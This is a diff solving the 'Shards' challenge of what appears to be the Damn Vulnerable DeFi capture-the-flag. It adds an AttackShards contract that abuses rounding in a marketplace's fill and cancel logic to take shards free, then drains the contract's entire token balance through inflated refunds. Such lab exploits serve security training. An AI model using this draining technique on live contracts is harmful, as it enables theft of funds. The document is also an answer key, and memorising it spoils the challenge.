@@ -114,7 +114,7 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        new AttackShards(marketplace, token, recovery);
     }
 
     /**
@@ -134,5 +134,28 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+contract AttackShards {
+    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
+        token.approve(address(marketplace), type(uint256).max);
+
+        // 1. Fill 133 shards (cost 0 due to rounding down)
+        marketplace.fill(1, 133);
+        // 2. Cancel (refund > 0)
+        marketplace.cancel(1, 0);
+
+        // 3. Drain all DVT
+        uint256 balance = token.balanceOf(address(marketplace));
+        uint256 rate = marketplace.rate();
+        // refund = shards * rate / 1e6
+        // shards = balance * 1e6 / rate
+        uint256 shards = balance * 1e6 / rate;
+
+        marketplace.fill(1, shards);
+        marketplace.cancel(1, 1);
+
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
